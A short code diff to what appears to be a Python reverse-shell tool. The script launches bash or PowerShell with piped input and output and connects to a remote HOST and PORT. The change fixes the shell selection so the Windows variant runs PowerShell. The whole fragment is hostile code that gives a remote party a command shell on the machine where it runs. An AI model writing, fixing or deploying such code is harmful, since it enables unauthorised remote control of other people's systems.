@@ -8,7 +8,7 @@ async def main_windows():
     await main_unix("powershell.exe")
 
 async def main_unix(exe="bash"):
-    shell = await asyncio.create_subprocess_shell("bash", stdin=asyncio.subprocess.PIPE, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
+    shell = await asyncio.create_subprocess_shell(exe, stdin=asyncio.subprocess.PIPE, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
 
     (reader, writer) = await asyncio.open_connection(HOST, PORT)
 
